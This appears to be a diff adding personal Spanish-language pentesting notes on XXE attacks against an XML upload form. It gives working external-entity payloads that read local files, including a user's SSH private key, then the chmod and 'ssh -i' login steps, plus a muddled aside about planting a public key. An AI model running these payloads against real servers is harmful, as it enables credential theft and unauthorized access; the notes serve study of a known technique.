@@ -1,0 +1,63 @@
+1 = Buscariamos un directorio o web en la que podamos subir archivos [En este caso XML].
+2 = Ejemplos:
+
+    * Vemos que nos pide que subamos un archivo XML ctal como así:
+
+        XML elements: Author, Subject, Content
+
+    * En este caso suponemos que hay una etiqueta principal que se llama "elements"
+    * Cremoa un archivo .xml:
+
+        <elements>#Definimos las siguientes etiquetas
+            <Author>Ruben</Author>
+            <Subject>Esto es una prueba</Subject>
+            <content>Contenido</content>
+        </elements>
+
+    * Tratamos de subir el archivo y ver que ocurre:
+
+        Cuando nos vamos a la URL del archivo subido, nos interesa ver que cuando cargamos la web, nos indica los datos xml 
+        junto con información de un path en el cual se aloja.
+
+    * Si esto aparece, podriamos intentar un ataque de tipo "XXE"
+
+        Podriamos buscar un codigo de tipo Grap, para leer archivos internos de la maquina victima. Tal que declare una entidad por ejemplo:
+
+        <?xml  version="1.0" encoding="ISO-8859-1"?>
+        <!DOCTYPE foo [
+            <!ELEMENT foo ANY >
+            <!ENTITY xxe SYSTEM  "file:///dev/random" >]>#Hasta aqui la entidad
+        <elements>#Definimos las siguientes etiquetas
+            <Author>&xxe;</Author>#Cambiamos Ruben por la entidad que hemos ceclarado "xxe"
+            <Subject>Esto es una prueba</Subject>
+            <content>Contenido</content>
+        </elements>
+
+    * Si ahora subimos el archivo, al recargar veremos que nos aparece el input del comando o binario o archivo de la máquina victima.
+    * A través de esto podemos intentar que nos revele la clave privada SSH en el caso de que la tenga, introduciendo su PATH. Para 
+    intentar entrar en la máquina sin contraseña.
+
+    * Lo que podemos hacer es copiarnos nuestra propia llave pública, transferirlo al servidor, nuestro servidor tercero "VPS", y meterlo 
+    dentro del directorio .ssh de cualquier usuario bajo al cual yo me quiera conectar al sistema sin proporcionar contraseña.
+    Y lo que hacemos esque nuestra id_rsa.pub lo comvertimos a "authoricedKey"
+
+    * Una ved hemos encontrado el directorio de algun usuario hacemos lo siguiente y lo bolvemos a subir:
+
+        <?xml  version="1.0" encoding="ISO-8859-1"?>
+        <!DOCTYPE foo [
+            <!ELEMENT foo ANY >
+            <!ENTITY xxe SYSTEM  "file:///home/usuario/.ssh/id_rsa" >]>#Cambiamos directorio
+        <elements>
+            <Author>&xxe;</Author>
+            <Subject>Esto es una prueba</Subject>
+            <content>Contenido</content>
+        </elements>
+    
+    * En el caso de conseguir la clave, copiamos y pegamos y lo guardamos con el mismo nombre.
+    * Cambiamos el privilegio a 600
+    * Ahora escribiriamos el siguiente comando:
+
+            ssh -i id_rsa usuario@ip 
+
+            Presionamos enter y ya deberiamos entrar.
+    
